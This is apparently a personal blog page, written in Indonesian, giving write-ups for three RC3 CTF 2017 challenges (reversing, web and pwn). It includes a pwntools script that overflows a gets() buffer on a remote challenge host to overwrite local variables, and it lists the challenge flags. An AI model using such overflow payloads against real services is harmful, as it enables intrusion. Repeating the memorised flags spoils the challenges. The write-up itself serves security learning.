@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>RC3 CTF 2017 Write Up :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Reversing (100) Diberikan file elf 64bit not stripped.
+$ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped Hanya dengan menggunakan strings didapatkan Flag yang benar.
+$ strings hello | grep RC RC3-2017{little_ball_of_fur} Cukup mudah untuk challenge dengan points 100 :) Flag : RC3-2017{little_ball_of_fur}
+Web (100) Diberikan sebuah website ()[http://13.59.6.98]
+$ curl http://13.59.6.98 &amp;lt;meta http-equiv=&amp;#34;refresh&amp;#34; content=&amp;#34;0; url=C.html&amp;#34; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt; Website tersebut akan otomatis direfresh apabila dikunjungi via Browser."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/post/2017-11-21-rc3-ctf-2017/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RC3 CTF 2017 Write Up"/>
+<meta name="twitter:description" content="Reversing (100) Diberikan file elf 64bit not stripped.
+$ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped Hanya dengan menggunakan strings didapatkan Flag yang benar.
+$ strings hello | grep RC RC3-2017{little_ball_of_fur} Cukup mudah untuk challenge dengan points 100 :) Flag : RC3-2017{little_ball_of_fur}
+Web (100) Diberikan sebuah website ()[http://13.59.6.98]
+$ curl http://13.59.6.98 &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=C.html&#34; /&gt; &lt;p hidden&gt;R&lt;/p&gt; Website tersebut akan otomatis direfresh apabila dikunjungi via Browser."/>
+
+
+
+<meta property="og:title" content="RC3 CTF 2017 Write Up" />
+<meta property="og:description" content="Reversing (100) Diberikan file elf 64bit not stripped.
+$ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped Hanya dengan menggunakan strings didapatkan Flag yang benar.
+$ strings hello | grep RC RC3-2017{little_ball_of_fur} Cukup mudah untuk challenge dengan points 100 :) Flag : RC3-2017{little_ball_of_fur}
+Web (100) Diberikan sebuah website ()[http://13.59.6.98]
+$ curl http://13.59.6.98 &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=C.html&#34; /&gt; &lt;p hidden&gt;R&lt;/p&gt; Website tersebut akan otomatis direfresh apabila dikunjungi via Browser." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/2017-11-21-rc3-ctf-2017/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/post/2017-11-21-rc3-ctf-2017/">RC3 CTF 2017 Write Up</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by Aiden Pearce</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/rc3ctf/">rc3ctf</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/ctf.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <h1 id="reversing-100">Reversing (100)</h1>
+<p>Diberikan file elf 64bit not stripped.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file hello
+hello: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped
+</code></pre></div><p>Hanya dengan menggunakan <code>strings</code> didapatkan Flag yang benar.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings hello | grep RC
+RC3-2017<span style="color:#f92672">{</span>little_ball_of_fur<span style="color:#f92672">}</span>
+</code></pre></div><p>Cukup mudah untuk challenge dengan points 100 :)
+Flag : <code>RC3-2017{little_ball_of_fur}</code></p>
+<h1 id="web-100">Web (100)</h1>
+<p>Diberikan sebuah website ()[http://13.59.6.98]</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl http://13.59.6.98
+&lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0; url=C.html&#34;</span> /&gt; &lt;p hidden&gt;R&lt;/p&gt;
+</code></pre></div><p>Website tersebut akan otomatis direfresh apabila dikunjungi via Browser. Tapi terdapat bagian <code>&lt;p hidden&gt;R&lt;/p&gt;</code> yang seperti nya adalah flag nya apabila mengikuti bagian <code>url=C.html</code></p>
+<p>Berikut script yang digunakan untuk melakukan automasi.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> re
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://13.59.6.98&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+	r <span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url)
+	content <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content
+	flag <span style="color:#f92672">+=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;&lt;p hidden&gt;(.*?)&lt;/p&gt;&#34;</span>,content)[<span style="color:#ae81ff">0</span>]
+	<span style="color:#66d9ef">if</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>:] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;777&#34;</span>:
+		<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Flag : {}&#34;</span><span style="color:#f92672">.</span>format(flag)
+		<span style="color:#66d9ef">break</span>
+	url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://13.59.6.98/{}&#34;</span><span style="color:#f92672">.</span>format(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;url=(.*?)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,content)[<span style="color:#ae81ff">0</span>])
+</code></pre></div><p>Setelah menunggu beberapa saat Flag akan muncul.</p>
+<p>Flag : <code>RC3W3MUS7G0D33P3RR3D1R3C777</code></p>
+<h1 id="pwn-100">Pwn (100)</h1>
+<p>Diberikan sebuah file elf 32bit stripped bernama <code>easy_peasy</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file easy_peasy 
+easy_peasy: ELF 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.24, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>3a5dd5cc49b1a8efbc0a6269bdea9c1da99b3bcf, stripped
+$ checksec easy_peasy 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;easy_peasy&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</code></pre></div><p>Hasi decompile menggunakan <code>IDA PRO</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>()
+{
+  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// [sp+18h] [bp-18h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [sp+28h] [bp-8h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [sp+2Ch] [bp-4h]@1
+</span><span style="color:#75715e"></span>
+  v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  printf(<span style="color:#e6db74">&#34;Enter Key: &#34;</span>);
+  gets((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v0);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xCAFEF00D</span> <span style="color:#f92672">&amp;&amp;</span> v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC0FFEE</span> )
+    sub_80484EF();
+  puts(<span style="color:#e6db74">&#34;Error: Invalid key!&#34;</span>);
+  srand(<span style="color:#ae81ff">1u</span>);
+  init();
+}
+</code></pre></div><p>Terlihat penggunaan fungsi <code>gets</code> yang vulnerable <em>Buffer Overflow</em>. Dan seperti nya tujuan dari challenge ini adalah melakukan <em>Overwrite Local Variable</em> v1 dan v2.</p>
+<p>Perhitungan Padding.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// [sp+18h] [bp-18h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [sp+28h] [bp-8h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [sp+2Ch] [bp-4h]@1
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;</span> <span style="color:#75715e"># jumlah padding untuk overwrite v1</span>
+<span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span> 
+<span style="color:#ae81ff">16</span>
+<span style="color:#f92672">&gt;&gt;</span> <span style="color:#75715e"># jumlah padding untuk overwrite v2</span>
+<span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span>
+<span style="color:#ae81ff">20</span>
+</code></pre></div><p>Berikut script yang digunakan</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+baby <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;18.216.183.46&#34;</span>,<span style="color:#ae81ff">4200</span>)
+p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
+p <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xC0FFEE</span>) <span style="color:#75715e"># v1</span>
+p <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>) <span style="color:#75715e"># v2</span>
+baby<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;: &#34;</span>,p)
+<span style="color:#66d9ef">print</span> baby<span style="color:#f92672">.</span>recvline()
+</code></pre></div><p>Flag: <code>RC3-2017{S3E_N0T_TO0_B4D_HUH_ec1368b59b858e08}</code></p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/2017-11-20-rc3-ctf-2017/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">RC3 CTF 2017 Write Up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/2017-11-27-school-ctf-2017/">
+                  <span class="button__text">School CTF 2017 - Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
